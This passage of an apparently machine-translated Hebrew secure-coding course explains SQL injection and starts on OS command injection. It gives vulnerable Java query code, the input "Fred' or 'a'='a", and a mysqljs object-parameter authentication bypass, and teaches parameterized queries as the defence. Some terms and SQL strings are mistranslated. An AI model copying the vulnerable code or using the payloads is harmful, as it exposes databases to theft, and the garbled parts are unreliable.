כעת נבחן כמה מקרי התקף הזרקה נפוצים וכיצד לטפל בהם בצורה מאובטחת. שוב, פגיעות בהזרקה היא כאשר תוכנית מקבלת נתונים מתוקף ומעבירה נתונים אלה באופן לא תקין למתורגמן פקודות כלשהו. חלק מהבעיות הנפוצות ביותר מתרחשות כאשר נתונים אלה נשלחים למערכת מסד נתונים (התקפות הזרקת SQL) או למפרש פקודות של מערכת ההפעלה (התקפות הזרקת פקודות של מערכת ההפעלה), ולכן נתמקד בהן. ברגע שתבינו כיצד להתמודד עם שני המקרים הנפוצים הללו, יהיה הרבה יותר ברור כיצד לטפל כראוי במתורגמנים אחרים שלא נסקור כאן (למשל, פרוטוקול הגישה לספריות קל משקל (LDAP)). נתחיל בדיון בשליחת נתונים למערכות מסדי נתונים, שלעתים קרובות פגיעות להתקפות הזרקת SQL.

#### חידון 3.1: מבוא לתוכניות שיחות מאובטחות - היסודות

\>\>פשוט בחר תוכנה מאובטחת לשימוש חוזר, והיישום שלך יהיה מאובטח. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

זה לא נכון. ברור שאם תבחר  תוכנה *לא מאובטחת* ידועה, תהיה לך בעיה. בנוסף, עליך להעדיף תוכנה קלה יותר לשימוש מאובטח. אבל באופן כללי, אתה צריך *להשתמש* בתוכנה בשימוש חוזר בצורה מאובטחת - לא רק לבחור רכיבים מאובטחים.

[הסבר]

## קריאה לתוכניות אחרות: הזרקה ושמות קבצים

### הזרקת SQL

#### פגיעות בהזרקת SQL

![טקסט חלופי של תמונה](exploits_of_a_mom.png)

**מעלליה של אמא, **שאוחזרו מ-xkcd.com, [](https://xkcd.com/327/)ברישיון [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

רוב מערכות מסדי הנתונים כוללות שפה שיכולה לאפשר לך ליצור שאילתות שרירותיות, ובדרך כלל גם פונקציות רבות אחרות (למשל, יצירה ושינוי של דברים). שפת SQL נפוצה במיוחד, ובעוד שמערכות מסדי נתונים מסוימות משתמשות בשפות אחרות, לשפות אחרות אלה יש לעתים קרובות קווי דמיון עם SQL. שפות כאלה, כולל SQL, כוללות מטא-תווים. כאשר תוקפים יכולים להוסיף מטא-תווים לפקודת SQL כדי לגרום לבעיית אבטחה, ההתקפה  נקראת התקפת הזרקת SQL*, והפגיעות נקראת *פגיעות הזרקת SQL**. הזרקת SQL לפעמים מקוצרת כ- SQLi.

גם אם שפת מסד הנתונים אינה SQL, אם מדובר בהתקפה על שפה עבור מערכת מסד נתונים היא נקראת לעתים קרובות התקפת הזרקת SQL (למרות שטכנית זה לא מדויק). אנו נתמקד ב- SQL, מכיוון ש- SQL נפוץ מאוד וברגע שאתה מבין כיצד להתמודד עם התקפות הזרקת SQL, קל להכליל זאת לכל שפת מסד נתונים.

הנה דוגמה טריוויאלית; הנה קטע של Java שמנסה לבצע שאילתת SQL, אך עושה זאת בצורה לא מאובטחת:

~~~~java
    String QueryString = "select * from authors where lastname = ' " + search_lastname + " '; "; // VULNERABLE CODE
    rs = statement.executeQuery(QueryString); // VULNERABLE CODE
~~~~

הכוונה ברורה; אם **יש search_lastname** את  הערך ** פרד, אז מסד הנתונים יקבל את השאילתה "**בחר * ממחברים שבהם שם משפחה = 'פרד';**** " - שאילתת SQL סבירה. אבל זכרו את סימני האזהרה שלנו - הקוד הזה משרשר מחרוזות, חלק מהנתונים האלה כנראה מסופקים על ידי תוקף, ואנחנו עושים משהו שנקרא "ביצוע".  סימני האזהרה נכונים. תארו לעצמכם שהתוקף מספק את הקלט "**פרד" או 'a'='a**". פעולה זו תפיק את השאילתה "**בחר * ממחברים שבהם שם משפחה** = 'פרד' או 'a'='a'; " ועכשיו התוקף יכול לאחזר את מסד הנתונים כולו. התוקף יכול אפילו לשנות או למחוק נתונים בדרך זו, בהתאם לגורמים שונים. זוהי דוגמה פשוטה להתקפת הזרקת SQL; תוקף יכול להוסיף תווים מסוימים ולהזריק פקודות חדשות או פקודות שהשתנו.

ישנן דרכים רבות להפעיל התקפות הזרקת SQL; התוקפים יכולים להוסיף ציטוטים בודדים (המשמשים להקפת נתוני תווים קבועים), נקודה-פסיק (המשמשים כמפרידי פקודות), "-**-**" שהוא אסימון הערה, וכן הלאה. זו אינה רשימה מלאה; מערכות מסדי נתונים שונות מפרשות תווים שונים באופן שונה. לדוגמה, מרכאות כפולות הן לעתים קרובות metacharacters, אבל עם משמעויות שונות. אפילו גרסאות  שונות של *אותה* מערכת מסד נתונים, או תצורות שונות, יכולות לגרום לשינויים באופן הפרשנות של התווים. אנחנו כבר יודעים שאנחנו לא צריכים ליצור רשימה של תווים "רעים", כי זה מכחיש. אנחנו יכולים ליצור רשימה מאפשרת של תווים שאנחנו יודעים שהם לא מטא-תווים ואז לברוח מהשאר, אבל קשה לעשות את התהליך הזה בצורה נכונה עבור SQL.

אל תשרשר מחרוזות כדי ליצור שאילתת DBMS, מכיוון שהיא אינה מאובטחת כברירת מחדל. זה כולל שימוש במחרוזות תבנית, אינטרפולציות של מחרוזות, תבניות מחרוזות וכל המנגנונים האחרים שפשוט משרשרים טקסט. לדוגמה, אותן פגיעויות מתרחשות אם אתה משתמש במילולי מחרוזות מעוצבות  של Python (מחרוזות f כגון f'{year}-{month}'), בשיטה של <tt>Python </tt> , במחרוזות התבנית של JavaScript`.format` (), באינטרפולציות המחרוזות של PHP ("${year}-${month}"), באינטרפולציה של מחרוזת Ruby<tt>`${year}-${month}`</tt> ("#{year}-#<tt>{month}"),</tt> בתבניות Go (string) או בכל תבנית או שפת עיצוב אחרת המבוססת על <tt>מחרוזות</tt>. זכור, אנו רוצים לנסות להשתמש בשגרה שקל להשתמש בה באופן מאובטח, וכל אלה מסוכנים כברירת מחדל כאשר משתמשים בהם ליצירת פקודות כגון פקודות SQL.

מפתחים רבים מנסים לתקן זאת בצורה לא חכמה על ידי קריאה לשגרת בריחה על כל ערך, למשל, כך:

~~~~java
    String QueryString = "select * from authors where lastname = ' " +
                         sql_escape(search_lastname) + " '; "; // BAD IDEA
~~~~

גישה זו (קריאה לשגרת בריחה בכל פעם שאתה משתמש בקלט לא מהימן)
יש פגם מהותי: *ברירת המחדל* אינה בטוחה.
אם יש לקרוא לשגרת בריחה בכל פעם שנעשה שימוש בנתונים לא מהימנים,
ויש שימושים רבים בנתונים לא מהימנים,
בסופו של דבר מישהו ישכח לקרוא לפונקציית הבריחה.
תוכניות רבות יוצרות שאילתות רבות, ולכן ישנן הזדמנויות רבות
לשכוח לעשות את זה.
הטעות יכולה לקרות בהתחלה, או מאוחר יותר כאשר הקוד משתנה,
אבל הניסיון מראה שהטעות *תקרה* .

>  שעת סיפור: מערכות תשלומים בלב הארץ / הזרקת SQL

> בסוף 2007 התוקפים השתמשו במתקפת הזרקת SQL כדי לסכן את מסד הנתונים של מערכות התשלומים Heartland (המכונה "Heartland"). באותה תקופה עיבדה Heartland 100 מיליון עסקאות בכרטיסי תשלום בחודש עבור 175,000 בתי עסק. התוקפים השתמשו בהזרקת SQL כדי להוסיף קוד לקבצי Script של אינטרנט המשמשים את דף הכניסה לאינטרנט. התוקפים השתמשו בסופו של דבר בהנחה זו כדי להתקין תוכנת ריגול בשם 'רחרחן' שלכדה את נתוני הכרטיס בזמן שהתשלומים עובדו במשך מספר חודשים בשנת 2008. כתוצאה מכך, Heartland איבדה באופן זמני את עמידתה בתקן אבטחת הנתונים של תעשיית כרטיסי התשלום (PCI DSS), שנדרש כדי ליישם את עסקי הליבה שלהם בעיבוד תשלומים בכרטיסים. על פי הדיווחים, הארטלנד נאלצה לשלם 145 מיליון דולר כפיצוי על תשלומים מזויפים ("[הוראות לדליפת נתונים: מה לעשות לאחר התקפה" מאת דיאן ריצ'י](https://www.securitymagazine.com/articles/86071-data-breach-directions-what-to-do-after-an-attack)). מאז הם נקטו צעדים רבים כדי להפוך את המערכות שלהם לחזקות וחזקות יותר כדי לנסות למנוע הישנות.

 הזרקת SQL היא מקרה מיוחד של התקפות הזרקה, וכבר ציינו כי התקפות הזרקה הן כה נפוצות ומסוכנות עד שהן 2017 OWASP Top 10 #1. הזרקת SQL באופן ספציפי היא סיבה כה נפוצה לפגיעויות אבטחה שרק הזרקת SQL היא 2021 CWE Top 25 #6 ו- 2019 CWE Top 25 #6. הזרקת SQL מזוהה גם כ- [CWE-89](https://cwe.mitre.org/data/definitions/89.html), *נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודת SQL ('הזרקת SQL')*.

שוב, אנחנו רוצים לנסות להשתמש בגישה שקל להשתמש בה בצורה נכונה - היא צריכה להיות מאובטחת כברירת מחדל.

עבור מסדי נתונים, ישנם פתרונות ידועים שהם הרבה יותר קלים לשימוש מאובטח.

#### פתרונות הזרקת SQL

פגיעויות הזרקת SQL הן אחת הפגיעויות הנפוצות וההרסניות ביותר, במיוחד ביישומי אינטרנט. הם גם קל להתמודד, ברגע שאתה יודע איך לעשות את זה.

*הצהרות עם פרמטרים, *הידועות גם *כשאילות עם פרמטרים*, הן אולי הדרך הטובה ביותר להתמודד עם התקפות הזרקת SQL אם אתה יוצר ישירות פקודות SQL שצריכות להיות מאובטחות. משפטים עם פרמטרים הם משפטים המאפשרים לך לזהות מצייני מיקום (לעתים קרובות "**?** ") לנתונים שצריך לברוח מהם. ספריה קיימת שאתה קורא לה לוקחת את הפרמטרים האלה ולמעשה בורחת מהנתונים כראוי ליישום הספציפי הזה. התחביר המדויק עבור מצייני מיקום תלוי בספריה ו/או במסד הנתונים שבהם אתה משתמש.

לענייננו, *הצהרה מוכנה* מרכזת את ההצהרה עם מערכת מסד הנתונים מראש, כך שניתן יהיה לבצע בקשה מאוחרת יותר עם נתונים ספציפיים בצורה יעילה יותר. הכנת הצהרה עם מסד נתונים מראש יכולה לשפר את הביצועים אם ההצהרה תבוצע מספר פעמים. ממשקי API של הצהרות מוכנות כוללים בדרך כלל תמיכה בהצהרות עם פרמטרים, ואנשים רבים (וממשקי API) משתמשים במונחים "הצהרה מוכנה" ו"הצהרה עם פרמטרים" כמילים נרדפות.

לצורך אבטחה, המפתח הוא להשתמש ב- API עם הצהרות עם פרמטרים (כולל API של הצהרה מוכנה) ולוודא שכל קלט לא מהימן נשלח כפרמטר נפרד. ודא שבדרך כלל אינך ** כולל  קלט לא מהימן על-ידי שרשור נתונים לא מהימנים כמחרוזת (כולל מחרוזת מעוצבת) בבקשה.

##### היתרונות של משפטים פרמטריים/מוכנים

לרוב שפות התכנות יש לפחות ספריה אחת המיישמת הצהרות עם פרמטרים ו/או משפטים מוכנים. לשימוש במשפטים פרמטרים, כולל באמצעות משפטים מוכנים, יש יתרונות רבים:

1. מכיוון שהספרייה עושה את הבריחה עבורך, היא פשוטה יותר לשימוש וסביר יותר שהיא צודקת.

2. הוא נוטה לייצר קוד קל יותר לתחזוקה, מכיוון שהקוד נוטה להיות קל יותר לקריאה.

3. רבים יכולים להתמודד עם שונות במנועי SQL שונים (וזה חשוב מכיוון שלמערכות שונות יש לעתים קרובות כללי תחביר שונים).

##### דוגמה: משפטים מוכנים ב- Java

הנה דוגמה לשימוש במשפטים מוכנים ב- Java
באמצעות ממשק JDBC שלה:

~~~~java
    String QueryString = "select * from authors where lastname = ?";
    PreparedStatement pstmt = connection.prepareStatement(QueryString);
    pstmt.setString(1, search_lastname);
    ResultSet results = pstmt.execute( );
~~~~

יש יותר הצהרות מהדוגמה הקודמת שלנו, אבל ההצהרות פשוטות יותר. בפרט, השרשור המסובך הוא כעת קבוע מחרוזת פשוט. אנחנו עדיין קוראים למשהו שנקרא "**ביצוע**" - אבל זכרו, הימנעות משיטות בשם "ביצוע" היא רק כלל אצבע שיעזור לנו לזהות בעיות פוטנציאליות.

הערה: הצהרה עם פרמטרים מסוימים ו/או הצהרה מוכנה
ספריות אינן בטוחות לכריכים. במילים אחרות,
ספריות מסוימות מניחות שבכל זמן נתון רק שרשור יחיד יכול
גישה למופע.
זה נכון לגבי ה-API של ההצהרה שהוכנה על-ידי Java המשמש כאן;
ממשק API זה של Java אינו בטוח להליכי משנה. אז בעת שימוש בממשק Java זה,
הגדרת אובייקטים כמשתנים `PreparedStatement` ברמת השיטה בלבד
(במקום משתנים ברמת הכיתה) כדי להפחית את הסיכון לבטיחות הליך המשנה
בעיות, כפי שהוצע על ידי
[*טבלאות בובי* (ג'אווה).](https://bobby-tables.com/java)

כמובן, כמו כל טכניקה, אם אתה משתמש בו לא נכון אז זה לא יהיה מאובטח. הנה דוגמה כיצד להשתמש בהצהרות מוכנות ב- Java כדי לייצר תוכנית כנראה לא מאובטחת:

~~~~java
    String QueryString = "select * from authors where lastname = '" + search_lastname + "';";
    PreparedStatement pstmt = connection.prepareStatement(QueryString);
    ResultSet results = pstmt.execute( ); // Probably insecure, don’t do this!
~~~~

תוכנית לא מאובטחת זו משתמשת בהצהרה מוכנה, אבל במקום להשתמש כראוי "**?** " כמציין מיקום של ערך (שלאחר מכן יימלט כראוי), קוד זה משרשר ישירות נתונים לתוך השאילתה. אלא אם כן הנתונים נמלטים כראוי (וזה כמעט בוודאות לא), קוד זה יכול להוביל במהירות לפגיעות חמורה אם נתונים אלה יכולים להיות נשלטים על ידי תוקף.

##### דוגמאות: משפטים עם פרמטרים והצהרות מוכנות בכמה שפות אחרות

הצהרות פרמטריות ומוכנות זמינות באופן נרחב, אם כי
ממשקי API ותחביר מציין מיקום משתנים בהתאם לשפת התכנות, הספריה ומסד הנתונים.
כאן נראה כמה דוגמאות.

בפייתון ישנן מספר ספריות המתממשקות למסדי נתונים.
רבים מהם מיישמים את מפרט ה- API של מסד הנתונים של Python v2.0
([פפ 249](https://peps.python.org/pep-0249/)),
אשר `execute` ושיטות `executemany` ליישם הצהרות פרמטרים.
תחביר מציין המיקום של הספריה מדווח לפי התכונה שלו `paramstyle` .
הנה דוגמה פשוטה של פייתון מתוך
תיעוד ספריית Python sqlite3
[פייתון (sqlite3)](https://docs.python.org/3/library/sqlite3.html):

~~~~python
    con = sqlite3.connect(...)
    cur = con.cursor()
    cur.execute("insert into test(d, ts) values (?, ?)", (today, now))
~~~~

להלן דוגמה לשאילתה מתוך התיעוד [go.dev בנושא שאילתה](https://go.dev/doc/database/querying):

~~~~go
    rows, err := db.Query("SELECT * FROM album WHERE artist = ?", artist)
~~~~

בעת שימוש ב- Node וב- JavaScript ישנן דרכים רבות לשימוש
הצהרות פרמטריות וערוכות.
הנה דוגמה לשימוש בממשק ההתקשרות החוזרת של הצומת-פוסטגרס,
כמתואר ב
[צומת-postgres תיעוד](https://node-postgres.com/features/queries):

~~~~javascript
    const text = 'INSERT INTO users(name, email) VALUES($1, $2) RETURNING *'
    const values = ['brianc', 'brian.m.carlson@gmail.com']
    client.query(text, values, (err, res) => { ....  })
~~~~

ממשק PostgreSQL `libpq` C מספק מספר פונקציות, כמו
מוסבר [בתיעוד PostgreSQL (פונקציות ביצוע פקודה):](https://www.postgresql.org/docs/current/libpq-exec.html)

* `PQexec` מפעיל ישירות פקודת מחרוזת בודדת ומחזיר תוצאה.
* `PQexecParams` מיישם משפט פרמטרי.
  מצייני מיקום מיוצגים בפקודה כ`$1`- `$2` , וכו',
  וערכי הפרמטרים מסופקים כפרמטרים נפרדים באותה שיחה.
* `PQprepare` מיישם הצהרה מוכנה.
  זה דורש הצהרה עם מצייני מיקום ו-
  מגיש אותו למסד הנתונים כדי להיות מוכן.
  משתמשים יכולים להשתמש מאוחר יותר בשיחה הנפרדת `PQexecPrepared` 
  כדי לספק את ערכי הפרמטרים של מציין המיקום ולבצע את התוצאה
  פקודה.

 [גיליון רמאות פרמטריזציה של שאילתת OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) ואתר [האינטרנט של טבלאות בובי](https://bobby-tables.com/) מספקים דוגמאות למגוון מערכות אקולוגיות.

##### בעיות עדינות: צד DBMS (שרת) לעומת צד יישום (לקוח)

סוגיה ביטחונית חשובה היא *היכן* 
פרמטרים של משפט פרמטרי מעובדים.
קיימות שתי אפשרויות, צד DBMS וצד יישום, וכן
DBMS-side עדיף מנקודת מבט ביטחונית.

מנקודת מבט של אבטחה עדיף שהפרמטרים של
משפטים עם פרמטרים מעובדים ישירות
בתוך מערכת ניהול מסדי הנתונים (DBMS),
aka "DBMS-side" עיבוד פרמטרים.
גישה זו נקראת לעתים קרובות "צד שרת" מכיוון ש- DBMSs רבים משתמשים ב-
ארכיטקטורת לקוח/שרת שבה הלקוח מתחבר דרך רשת
ל-DBMS בצד השרת.
ישנם יתרונות רבים לעיבוד פרמטרים בצד DBMS.
ל- DBMS יש את המידע הנוכחי על כללי בריחה
(ולעתים קרובות יכול להשתמש במנגנונים יעילים יותר מאשר הוספת תווי בריחה),
ויש לו גם מידע אחר כגון קידודי התווים הרלוונטיים
וסוגי נתונים צפויים.
אולי הכי חשוב, מפתחי DBMS בדרך כלל יהיו
מומחי אבטחה סוקרים חלק זה של מערכת DBMS.
עם זאת, עיבוד פרמטרים בצד DBMS עשוי לדרוש מאמץ רב יותר
ליישם, כך שספריות מסוימות משתמשות
עיבוד פרמטרים "בצד היישום" במקום זאת.

עיבוד פרמטרים "בצד היישום" מתרחש כאשר הפרמטר בורח
מתרחשת בתוך ספריה *שאינה* נמצאת ב- DBMS, אלא ביישום
שטח עיבוד.
זה נקרא גם עיבוד פרמטרים "בצד הלקוח".
מערכות עיבוד פרמטרים בצד היישום מיושמות בדרך כלל
על ידי הוספה ישירה של תווי escape היכן שהם נחוצים.
עיבוד פרמטרים בצד היישום הוא לעתים קרובות קל יותר ליישום, ולכן
מספר ספריות DBMS משתמשות בגישה זו.
ספריות בצד היישום עדיפות על קריאה ישירה לבריחה
מנגנון "ביד" על כל שימוש מאז הבריחות מתווספים באופן אוטומטי.

למרבה הצער, לעיבוד פרמטרים בצד היישום יש חולשה:
צד היישום עשוי לפרש מידע באופן שונה מה- DBMS.
חולשה זו עלולה להוביל לפגיעויות. לדוגמה:

1. הספריה בצד היישום עשויה להיות מיועדת לספרייה אחרת
   גירסה של DBMS. ל- DBMS עשויה להיות רשימה שונה של תווים
   או מצבים שצריך לברוח מהם.
2. הספרייה בצד היישום עשויה לפרש תווים מרובי בתים
   באופן שונה או לא לברוח תווים מרובי בתים כראוי עבור
   נסיבות שקיימות בפועל בצד של DBMS. (ראה
   [תו מרובה בתים מנצל את PHP/MySQL](https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql).)
3. אם הספריה בצד היישום מיישמת פרמטריזציה של
   סוגי נתונים מורכבים יותר ממספרים ומחרוזות (כגון מערכים,
   אובייקטים, מערכים אסוציאטיביים ו/או מילונים), ואז יש
   הוא סיכון משמעותי לפגיעות.
   הבעיה הבסיסית היא שהספרייה בצד היישום אינה
   ניתוח שפת השאילתה באותו אופן שבו ה- DBMS היה -
   הוא מבצע החלפות טקסט פשוטות. אז אם הספרייה מיישמת את זה
   פונקציונליות, זה בדרך כלל חייב לנחש ** אילו סוגים צפויים.
   לדוגמה, הוא עשוי לנחש שמערכים אסוציאטיביים נשלחים רק
   לספריה כאשר הדבר הגיוני בשאילתת SQL בעלת הפרמטרים.
   הניחוש הזה, למרבה הצער, עשוי להיות מנוצל.
   זהו סיכון מיוחד בשפות שאינן דורשות סוגים סטטיים
   (הידור זמן ידע של סוגים), כפי שהוא הרבה יותר קל לקבל בלתי צפוי
   סוגים מורכבים בספריה שלא תמיד יכולה לטפל בהם בצורה מאובטחת.
   לדוגמה, הצומת הנפוץ.js ספריית MySQL
   [mySQLJS/MYSQL](https://github.com/mysqljs/mysql)
   נכון לתחילת 2022, לעתים קרובות ניתן לניצול באמצעות ספריית הפרמטרים שלו
   *אם* ניתן לשלוח אליו אובייקט JavaScript כפרמטר
   (ראה
   [מציאת מעקף הרשאה באתר שלי](https://maxwelldulin.com/BlogPost?post=9185867776) על ידי מקסוול דולין (ꓘ)).

הבעיה האחרונה לעיבוד בצד היישום
(שלא תמיד ניתן לברוח כראוי מסוגי נתונים מורכבים)
יכול להיות מבלבל, כך שדוגמה עשויה לעזור.
בצומת.js ספריית mysqljs/mysql,
תארו לעצמכם שתוקף מצליח לספק
אובייקט ** `{password = 1}` JavaScript  כפרמטר הסיסמה
(זה לא רק מחרוזת, אלא אובייקט JavaScript בפועל).
עכשיו לדמיין כי אובייקט זה משמש בשאילתת SQL
<tt>בחר &#42; מחשבונות שבהם שם משתמש = ? וסיסמה = ?</tt> 
(שים לב שזה פרמטר).
הספריה תרחיב באופן פנימי את הביטוי לאחר `AND`
לתוך <tt> הסיסמה = &#96;password&#96; = 1</tt> מכיוון שהספרייה עושה פשוט
החלפת טקסט של השני `?`, מבלי לשים לב כי אובייקט JavaScript
אינו הגיוני בהקשר של שאילתה זו (מחרוזת או מספר
להיות צפוי כאן).
MYSQL DBMS יפרש  סיסמה = &#96;<tt>סיסמה&#96; </tt>
כ- 1 (true), ולאחר מכן לקבוע שהוא `1 = 1` נכון.
התוצאה: ביטוי זה *תמיד* יהיה נכון.
בריחה שגויה זו של סוג נתונים מורכב
זה מספיק כדי לעקוף לחלוטין את האימות במצבים מסוימים.

למרבה הצער, בעיה אחרונה זו יכולה להיות אתגר לפתרון:

1. הפתרון הבטוח הוא לוודא שסוגי נתונים מורכבים
   (סוגים שאינם מספרים ומחרוזות) אינם מורחבים על-ידי
   ספריות בצד היישום
   אלא אם כן היזם מסמן אותם במפורש כמותר.
   זה עשוי להיות לא מעשי אם היישום כבר תלוי בכך,
   וייתכן שהספריה לא תספק דרך להשבית את הפונקציונליות באופן מלא.
   לדוגמה, mysqljs/mysql מאפשר הגדרה `stringifyObjects` ל- true
   כאשר מתקשרים `mysql.createConnection` , אבל בעוד זה יכול לעזור,
   זה רק משבית בריחה אובייקטים גנריים - זה לא
   השבת סוגי נתונים מורכבים אחרים, כגון מערכים.
2. הפתרון הכללי הוא לאמת כל סוג לפני שמתקשרים לספרייה.
   לדוגמה, דרוש שכל הנתונים הצפויים להיות מחרוזות חייבים להיות מחרוזות.
   בדרך כלל קל לבצע זאת בשפה שהוקלדה באופן סטטי
   אם השפה אוכפת את הסוגים - פשוט להצהיר על הסוג הנדרש.
   זה יכול לקחת הרבה זמן ליישם בשפות שאינן
   לאכוף סוגים סטטיים, ויש גם את
   סיכון להחמצת בדיקה בעת יצירה או שינוי של הקוד.
   עם זאת, גישה זו גמישה יותר.
   (ראה  ["מציאת הזרקת SQL בלתי נראית על ידי עקיפת פונקציות בריחה ב- mysqljs/mysql"](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) מאת Flatt Security Inc., 2022-02-21.)

לעתים קרובות קשה לקבוע אם ספריה משתמשת בצד DBMS או
פרמטריזציה בצד היישום, ובנסיבות מסוימות
רק גישה בצד היישום זמינה.
במקרים מסוימים בקשת הצהרה מוכנה מאלצת את הספרייה
השתמש בעיבוד בצד DBMS, אך אל תניח זאת - בדוק את התיעוד.
אם יש לך בחירה מעשית, העדיף יישום בצד DBMS.

##### הליכים שמורים

מערכות מסד נתונים רבות תומכות ב"פרוצדורות מאוחסנות ", כלומר,
נהלים המוטמעים במסד הנתונים עצמו.
אם אתה משתמש בפרוצדורות מאוחסנות ובפקודות (כגון שאילתות)
בנויים בהם באופן דינמי, ואז אתה יכול שוב לקבל
פגיעויות הזרקת SQL.

שוב, הפתרון הטוב ביותר הוא בדרך כלל להשתמש במנגנון שאילתה פרמטרי
בעת יצירת הפקודה הדינמית (לדוגמה, SQL) בתוך
מאוחסנת. תיזהר; במערכות מסוימות המשתמשות בהם כראוי
יכול להיות קצת מסובך.

לקבלת מידע נוסף אודות שימוש בשאילתות עם פרמטרים
בהליכים שמורים, עיין בתיעוד של הספריה שלך,
[גיליון רמאות פרמטריזציה של שאילתת OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html#stored-procedure-examples), ו-
[OWASP SQL הזרקת גיליון רמאות](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

##### כאשר הצהרות עם פרמטרים לא יפעלו

במצבים מסוימים הצהרות עם פרמטרים (כולל
הצהרות מוכנות) *לא* יעבוד.
ממשקי API רבים של משפטים עם פרמטרים מאפשרים רק להחליף ערכי SQL, כך
הם אינם מאפשרים מידע משתנה כגון שמות הטבלאות, השמות
של עמודות, או של כיוון סדר המיון.

במקרים אלה ייתכן שיהיה עליך ליצור שאילתה על-ידי שרשור נתונים.
במקרים אלה, הקפד ** לאמת בקפידה את הנתונים (באמצעות רשימת התרה)
אז רק ערכים ספציפיים ובטוחים מותרים.
לעתים קרובות רשימת ההיתרים היא רשימה קצרה של ערכים מותרים, או לכל היותר
ביטוי פשוט המאפשר רק אותיות וספרות ASCII.
סיכון בגישה זו הוא שאם האימות
מדלג אי פעם (למשל, לאחר שינוי קוד כלשהו),
המערכת עלולה להיות פגיעה ביותר.

גיליון [הרמאות למניעת הזרקת SQL של OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
יש הצעה נחמדה: אם אתה *חייב* לעשות את השרשור הזה,
הפוך את קלט המשתמש *לשונה* ממה שתשתמש בו בפועל, וכן
בתוכנית למפות את קלט המשתמש לערכים שבהם תשתמש.
אם לקלט המשתמש אין מיפוי חוקי, דחה את הקלט.
פעולה זו מגדילה את ההסתברות לשינוי בתוכנית
לא יגרום לכך שקלט לא מתוקשר לשאילתה,
או שהבעיה תזוהה לפני המשלוח.
לדוגמה, ב- Python, אם עליך לכתוב לשם טבלה שסופק על-ידי המשתמש, באפשרותך לבצע את הפעולות הבאות:

~~~~python
    table_name_untrusted = request.get("table_name")  # This is untrusted, don't put this directly in the query!
    table_name_map = {"table1": "db.table1", "table2": "db.table2"}
    table_name = table_name_map[table_name_untrusted]
    con = sqlite3.connect(...)
    cur = con.cursor()
    cur.execute(f"insert into {table_name}(d, ts) values (?, ?)", (today, now)) # This is safe because we know that table_name can only take trusted values from table_name_map
~~~~

##### גישות אחרות להתמודדות עם הזרקת SQL

תוכניות רבות משתמשות במיפוי יחסי אובייקטים (ORM). זוהי רק טכניקה להמרה אוטומטית של נתונים במסד נתונים יחסי לאובייקט בשפת תכנות מונחית עצמים ובחזרה; הרבה ספריות ומסגרות יעשו זאת עבורך. זה בסדר, כל עוד ORM מיושם באמצעות הצהרות פרמטרים או משהו שווה ערך להם. בפועל, כל יישום ORM טוב יעשה זאת. אז אם אתה משתמש ב- ORM מכובד, אתה כבר עושה את זה. עם זאת, זה נפוץ במערכות המשתמשות ב- ORMs מדי פעם צריך להשתמש בשאילתות SQL ישירות... וכאשר אתה עושה זאת, השתמש בהצהרות עם פרמטרים או בהצהרות מוכנות.

יישומים מסוימים משתמשים בספריית "בונה שאילתות" כדי לבנות פקודות (שאילתות) באופן תיכנותי באמצעות רצף של קריאות במקום להטביע מחרוזת פקודה. ORMs מסוימים כוללים מערכת בונה שאילתות. שוב, בונה שאילתות מיושם היטב ישתמש במשפטים פרמטריים או דומים באופן פנימי. לכן, אם אתה משתמש בבונה שאילתות, השתמש בבונה שאילתות המיושם באמצעות הצהרות עם פרמטרים וספק נתונים לא מהימנים כפרמטרים נפרדים כדי שבונה השאילתות יוכל להשתמש במשפטים עם פרמטרים כראוי.

יש גישות אחרות, כמובן. אתה יכול לכתוב קוד בריחה משלך, אבל זה קשה לתקן, ובדרך כלל בזבוז זמן מכיוון שבדרך כלל יש ספריות קיימות שיעשו את העבודה.

לסיכום, שימוש נכון בספריות משפטים עם פרמטרים מקל על כתיבת קוד מאובטח. בנוסף, הם בדרך כלל הופכים את הקוד לקל יותר לקריאה, מטפלים באופן אוטומטי בווריאציות בין האופן שבו מסדי נתונים בורחים מדברים, ולפעמים הם מהירים יותר מאשר לבצע בריחה מטא-תווים בעצמך.

#### חידון 3.2: הזרקת SQL

\>\>הצהרות עם פרמטרים (כולל הצהרות מוכנות) הן אמצעי נגד רב ערך נגד הזרקת SQL, אך עליך להשתמש במצייני מיקום עבור כל ערך נתונים שעשוי להיות ניתן לשליטה על-ידי תוקף. אמת או שקר?<<

(x) נכון

( ) לא נכון

### הזרקת פיקוד (פגז) של מערכת ההפעלה

סוג נוסף של התקפת הזרקה הוא התקפת ההזרקה של מערכת ההפעלה (OS), הידועה גם כהתקפת הזרקת פגז. הדבר דומה להתקפת הזרקת SQL; הבעיה היא שמידע (בדרך כלל טקסט), חלקו מהימן וחלקו מהתוקף, נשלח למתורגמן שמבצע את מה שהוא נשלח. ההבדל הוא שבמקום להישלח למסד נתונים, תערובת זו נשלחת למפרש הפקודות של מערכת ההפעלה, המכונה מעטפת הפקודה.

לרוב המערכות יש לפחות מעטפת פיקוד אחת. אפילו מערכות משובצות קטנות, כמו טלוויזיות ונתבים, כוללות לעתים קרובות מעטפת פיקוד בפנים. פגזים שימושיים עבור דברים רבים, כולל שילוב מהיר של תוכניות, ביצוע כמה שאילתות, איתור באגים, וכן הלאה. מערכות דמויות יוניקס רבות, כולל הפצות לינוקס טיפוסיות, כוללות מספר פגזים זמינים, כולל bash, dash, ksh, zsh ו- csh; לפחות אחד מאלה מותקן כ- /bin/sh ** או  /**usr/bin/sh****. באופן דומה, MacOS מגיע עם מעטפת וניתן להתקין אחרים בקלות. מערכות Windows משתמשות בדרך כלל במעטפת שונה מאוד עם תחביר שונה מאוד (**cmd.exe**, **command.exe** או PowerShell), אך יש להן גם פגזים.

